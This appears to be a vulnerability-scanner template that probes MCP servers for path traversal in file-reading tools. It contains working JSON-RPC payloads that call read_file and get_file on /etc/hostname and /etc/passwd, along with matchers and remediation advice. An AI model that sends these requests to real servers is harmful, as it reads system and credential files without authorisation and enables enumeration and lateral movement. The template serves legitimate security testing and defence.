id: mcp-path-001-read-file-traversal
info:
  name: "MCP Server - Path Traversal via File Read Tool"
  type: exploit
  severity: high
  author: aipostex
  description: |
    MCP server exposes a file reading tool (read_file, get_file, file_read,
    or read_resource) that accepts arbitrary filesystem paths without
    restricting access to a safe directory. An attacker can read any file
    accessible to the MCP server process, including credentials, private
    keys, and application configuration.
  reference:
    - https://vulnerablemcp.info/
    - https://equixly.com/blog/2025/03/29/mcp-server-new-security-nightmare/
  tags: [mcp, path-traversal, lfi]
  classification:
    mitre-atlas: [AML.T0049]

detect:
  - method: POST
    path: /message
    headers:
      Content-Type: application/json
    body: '{"jsonrpc":"2.0","method":"tools/list","id":1}'
    matchers:
      - type: status
        value: "200"
      - type: body_regex
        value: "(read_file|get_file|file_read|read_resource)"

checks:
  - name: "File read tool available"
    method: POST
    path: /message
    headers:
      Content-Type: application/json
    body: '{"jsonrpc":"2.0","method":"tools/list","id":1}'
    matchers:
      - type: status
        value: "200"
      - type: body_regex
        value: "(read_file|get_file|file_read|read_resource)"
    extractors:
      - type: json
        name: tool_names
        path: "result.tools.#.name"
    severity: medium
    proof_stage: correlation
    proof_strength: reachable
    finding:
      title: "MCP Server Exposes File Read Tool"
      description: "MCP server exposes a file reading tool among: {{tool_names}}. Without path validation, this enables arbitrary file reads."
      remediation: "Restrict file access to an explicit allowlist of directories. Reject paths containing '..' or absolute paths outside the allowed root."

  - name: "Path traversal confirmed via read_file on /etc/hostname"
    method: POST
    path: /message
    headers:
      Content-Type: application/json
    body: '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"read_file","arguments":{"path":"/etc/hostname"}},"id":2}'
    matchers:
      - type: status
        value: "200"
      - type: body_not_contains
        value: "\"error\""
      - type: body_not_contains
        value: "denied"
      - type: body_not_contains
        value: "not allowed"
    severity: high
    proof_stage: proof
    proof_strength: confirmed
    finding:
      title: "MCP Path Traversal: read_file Reads /etc/hostname"
      description: "The read_file tool returned contents of /etc/hostname without restriction. Arbitrary file reads are possible for any file accessible to the MCP server process user."
      remediation: "Implement path validation with an allowlist of permitted directories. Block absolute paths and directory traversal sequences."
      evidence: |
        Payload:  tools/call read_file {"path":"/etc/hostname"}
        Result:   File contents returned without error
        Impact:   Arbitrary file read as MCP server process user

  - name: "Path traversal confirmed via read_file on /etc/passwd"
    method: POST
    path: /message
    headers:
      Content-Type: application/json
    body: '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"read_file","arguments":{"path":"/etc/passwd"}},"id":3}'
    matchers:
      - type: status
        value: "200"
      - type: body_contains
        value: "root:"
    severity: high
    proof_stage: proof
    proof_strength: confirmed
    finding:
      title: "MCP Path Traversal: read_file Reads /etc/passwd"
      description: "The read_file tool returned contents of /etc/passwd, confirming unrestricted filesystem access. User account enumeration and credential file exfiltration are possible."
      remediation: "Implement path validation with an allowlist of permitted directories. Block absolute paths and directory traversal sequences."
      evidence: |
        Payload:  tools/call read_file {"path":"/etc/passwd"}
        Result:   Response contained "root:" — /etc/passwd content returned
        Impact:   User enumeration, credential file access, lateral movement

  - name: "Path traversal confirmed via get_file on /etc/hostname"
    method: POST
    path: /message
    headers:
      Content-Type: application/json
    body: '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"get_file","arguments":{"path":"/etc/hostname"}},"id":4}'
    matchers:
      - type: status
        value: "200"
      - type: body_not_contains
        value: "\"error\""
      - type: body_not_contains
        value: "denied"
      - type: body_not_contains
        value: "not allowed"
    severity: high
    proof_stage: proof
    proof_strength: confirmed
    finding:
      title: "MCP Path Traversal: get_file Reads /etc/hostname"
      description: "The get_file tool returned contents of /etc/hostname without restriction."
      remediation: "Implement path validation with an allowlist of permitted directories."
      evidence: |
        Payload:  tools/call get_file {"path":"/etc/hostname"}
        Result:   File contents returned without error
        Impact:   Arbitrary file read as MCP server process user
